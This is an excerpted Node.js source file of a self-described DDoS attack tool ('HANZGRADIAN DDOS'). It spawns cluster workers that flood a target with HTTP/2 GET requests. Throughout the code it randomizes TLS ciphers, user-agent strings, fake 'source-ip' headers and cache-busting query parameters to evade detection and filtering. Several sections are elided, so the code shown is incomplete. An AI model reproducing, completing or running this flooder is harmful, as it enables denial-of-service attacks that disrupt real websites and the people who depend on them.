...
var cipher = cipherList[Math.floor(Math.random() * cipherList.length)];
...
if (cluster.isMaster) {
    console.log("═════════════════════════════════════════════════════════════");
    console.log(`HANZGRADIAN DDOS ATTACK`);
    console.log("═════════════════════════════════════════════════════════════");
    ...
    console.log("═════════════════════════════════════════════════════════════");
    console.log("HANZGRADIAN DDOS | HIGH RQ/S GLORY CUSTOM");
...
const randomNumberString = generateCryptoRandomString(10);
...
function runFlooder() {
    ...
    var ipPrefix = ipPrefixes[Math.floor(Math.random() * ipPrefixes.length)];
    var osVersion = osVersions[Math.floor(Math.random() * osVersions.length)];
    var architecture = architectures[Math.floor(Math.random() * architectures.length)];
    var ipPrefixAlt = ipPrefixesAlt[Math.floor(Math.random() * ipPrefixesAlt.length)];
    var windowsChannel = windowsChannels[Math.floor(Math.random() * windowsChannels.length)];
    var ipPrefixAlt2 = ipPrefixesAlt2[Math.floor(Math.random() * ipPrefixesAlt2.length)];
    var randomId = randomIds[Math.floor(Math.random() * randomIds.length)];
    ...
    function generateRandomStringWithRange(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    ...
    const rateHeaders = [
        ...
        {"source-ip": generateRandomAlphaNumericString(5)},
        {"data-return": "false"},
    ...
    let headers = {
        ...
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomAlphaNumericString(3) + "=" + generateRandomStringWithRange(10, 25),
        ":method": "GET",
        "pragma": "no-cache",
        ...
        "user-agent": "/5.0 (" + osVersion + "; " + windowsChannel + "; " + architecture + " ; " + randomId + " " + ipPrefixAlt + ") /Gecko/20100101 Edg/91.0.864.59 " + ipPrefixAlt,
    };
